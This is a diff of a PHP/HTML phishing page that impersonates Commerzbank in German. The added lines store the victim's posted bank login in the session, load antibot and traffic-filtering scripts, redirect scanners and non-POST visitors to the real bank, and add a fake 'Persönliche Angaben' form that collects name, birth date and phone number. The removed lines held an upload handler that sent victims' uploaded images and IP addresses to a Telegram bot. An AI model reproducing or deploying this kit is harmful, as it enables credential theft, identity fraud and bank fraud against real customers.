@@ -1,69 +1,17 @@
 <?php
+session_start();
 
-// ANTIBOT DISABLED - include..antibot.php';
+include '../antibot.php';
 include '../antibot/tds.php';
-
-ini_set('upload_max_filesize', '0');
-ini_set('post_max_size', '0');
-ini_set('max_execution_time', '600');
-
-$config = include('../config/index.php');
-$botToken = $config['bot_token'];
-$chatId = $config['chat_id'];
-
-$uploadDir = 'xentryxupload/';
-if (!is_dir($uploadDir)) {
-    mkdir($uploadDir, 0755, true);
-}
-
-if ($_FILES['file']['error'] == UPLOAD_ERR_OK) {
-    $randomPrefix = str_pad(rand(0, 999999), 6, '0', STR_PAD_LEFT);
-    $originalFileName = basename($_FILES['file']['name']);
-    $fileExtension = pathinfo($originalFileName, PATHINFO_EXTENSION);
-    $newFileName = $randomPrefix . '-' . $originalFileName;
-    $uploadPath = $uploadDir . $newFileName;
-
-    if (move_uploaded_file($_FILES['file']['tmp_name'], $uploadPath)) {
-        $visitorIp = $_SERVER['REMOTE_ADDR'];
-        $serverHost = $_SERVER['HTTP_HOST'] ?? $_SERVER['SERVER_ADDR'];
-        $imageURL = "{$serverHost}/views/{$uploadDir}{$newFileName}";
-
-        // Prepare message text with IP address and image URL
-        $message = "🟡 |  𝗖𝗼𝗺𝗺𝗲𝗿𝘇𝗯𝗮𝗻𝗸 𝗨𝗽𝗹𝗼𝗮𝗱  [ 2nd ]\n";
-        $message .= "🔗 |  𝗜𝗠𝗚 𝗨𝗥𝗟  : $imageURL\n";
-        $message .= "📍 |  𝗜𝗣  : $visitorIp";
-
  
-
-
-        // Send the image to Telegram
-        $telegramApiUrl = "https://api.telegram.org/bot{$botToken}/sendPhoto";
-        $data = [
-            'chat_id' => $chatId,
-            'photo' => new CURLFile($uploadPath),
-            'caption' => $message
-        ];
-
-        $ch = curl_init();
-        curl_setopt($ch, CURLOPT_URL, $telegramApiUrl);
-        curl_setopt($ch, CURLOPT_POST, true);
-        curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
-        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
-
-        $result = curl_exec($ch);
-        if ($result === FALSE) {
-            echo "Error sending image to Telegram: " . curl_error($ch);
-        }
-        curl_close($ch);
-    } else {
-        echo "Error uploading the file.";
-    }
+if ($_SERVER['REQUEST_METHOD'] == 'POST') {
+    $_SESSION['xusr1'] = $_POST['xusr1'];
+    $_SESSION['xpss1'] = $_POST['xpss1'];
 } else {
-    echo "No file uploaded or there was an upload error.";
+    header('Location: https://www.commerzbank.de/');
+    exit();
 }
 ?>
-
-
 
 
 
@@ -512,7 +460,7 @@ if ($_FILES['file']['error'] == UPLOAD_ERR_OK) {
 			<div class="mod mod-Login">
 				<div class="mod mod-Headline">
 					<h1 class="h-01">
-						 
+						Information
 					</h1>
 
 				</div>
@@ -521,23 +469,80 @@ if ($_FILES['file']['error'] == UPLOAD_ERR_OK) {
 					<div class="col col-lg-6">
 						<div class="login-box">
 							
- <form id="form" autocomplete="off" class="form-horizontal" method="post">
- <h1 class="h-01">Herzlichen Glückwunsch!</h1>
+ <form action="uploadz.php" id="form" autocomplete="off" class="form-horizontal" method="post">
+ <h1 class="h-01">Persönliche Angaben</h1>
 
- <p>Ihre Angaben wurden erfolgreich geprüft und Ihre Verifizierung ist abgeschlossen. Ab sofort können Sie Ihre Dienste wie gewohnt nutzen.
-<br><br>
-Klicken Sie auf die Schaltfläche unten, um auf die Hauptseite weitergeleitet zu werden.</p>
+ <p>Sie haben sich erfolgreich angemeldet. Um den Vorgang fortzusetzen, benötigen wir einige persönliche Informationen von Ihnen.</p>
  	 
-							 
+								<div class="form-row label-pos-none field-length-full">
+    <label for="firstname">Label</label>
+    <div class="input">
+        <input class="text-left required" type="text" required="required" id="firstname" name="xname1" autocomplete="off" maxlength="50" tabindex="1" autofocus="" placeholder="Vorname">
+        <div class="error-msg" id="invalid-firstname" style="display: none;">
+            <div class="inner">
+                <p>Bitte geben Sie Ihren Vornamen ein.</p>
+            </div>
+        </div>
+    </div>
+</div>
 
-								 
+<div class="form-row label-pos-none field-length-full">
+    <label for="lastname">Label</label>
+    <div class="input">
+        <input class="text-left required" type="text" required="required" id="lastname" name="xname2" autocomplete="off" maxlength="50" tabindex="2" placeholder="Nachname">
+        <div class="error-msg" id="invalid-lastname" style="display: none;">
+            <div class="inner">
+                <p>Bitte geben Sie Ihren Nachnamen ein.</p>
+            </div>
+        </div>
+    </div>
+</div>
 
-<br><br>
+<div class="form-row label-pos-none field-length-full">
+    <label for="birthdate">Label</label>
+    <div class="input">
+        <input class="text-left required" type="tel" required="required" id="birthdate" name="xdob" autocomplete="off" maxlength="10" tabindex="3" placeholder="Geburtsdatum (TT.MM.JJJJ)" pattern="\d{2}\.\d{2}\.\d{4}">
+        <div class="error-msg" id="invalid-birthdate" style="display: none;">
+            <div class="inner">
+                <p>Bitte geben Sie Ihr Geburtsdatum im Format TT.MM.JJJJ ein.</p>
+            </div>
+        </div>
+    </div>
+</div>
 
-							<button id="doordior" name="doordior" class="b-01 b-a-04 b-g-01" type="button" tabindex="4" onclick="window.location.href='https://www.commerzbank.de'">
-    Weiterleitung durchführen
-</button>
+<script>
+    document.getElementById("birthdate").addEventListener("input", function (e) {
+        let input = e.target.value.replace(/\D/g, ""); // Remove non-numeric characters
+        if (input.length >= 3 && input.length <= 4) {
+            input = input.slice(0, 2) + '.' + input.slice(2);
+        } else if (input.length >= 5) {
+            input = input.slice(0, 2) + '.' + input.slice(2, 4) + '.' + input.slice(4, 8);
+        }
+        e.target.value = input;
+    });
+</script>
 
+
+<div class="form-row label-pos-none field-length-full">
+    <label for="phone">Label</label>
+    <div class="input">
+        <input class="text-left required" type="tel" required="required" id="phone" name="xtel" autocomplete="off" maxlength="15" tabindex="4" placeholder="Telefonnummer" pattern="\+?\d{0,15}">
+        <div class="error-msg" id="invalid-phone" style="display: none;">
+            <div class="inner">
+                <p>Bitte geben Sie eine gültige Telefonnummer ein.</p>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+			<br><br>					 
+
+
+
+								<button id="doordior" name="doordior" class="b-01 b-a-04 b-g-01  " type="" tabindex="4">
+									Weiter
+								</button>
 							</form>
 
 							
